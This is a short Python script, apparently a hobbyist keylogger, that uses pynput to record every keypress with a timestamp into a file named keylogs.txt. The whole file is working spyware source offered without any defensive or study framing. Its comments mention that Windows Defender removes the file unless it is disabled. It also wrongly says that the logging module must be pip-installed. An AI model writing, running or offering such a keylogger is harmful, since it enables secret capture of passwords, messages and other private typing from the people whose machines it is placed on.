from pynput.keyboard import Key, Listener   #import library, must pip install pynput
import logging                              #import library, must pip install logging

log_dir = ""

logging.basicConfig(filename    = (log_dir + "keylogs.txt"), 
                    level       = logging.DEBUG, 
                    format      = '%(asctime)s: %(message)s')
#key logger creates new file called "keylogs.txt" every time its executed.
#Windows defender will delete the file unless disabled

def on_press(key):          
#if key pressed, log it.
    logging.info(str(key))  

with Listener(on_press = on_press) as listener:     
#when key is pressed, take key and create string to put into the file.
    listener.join()             

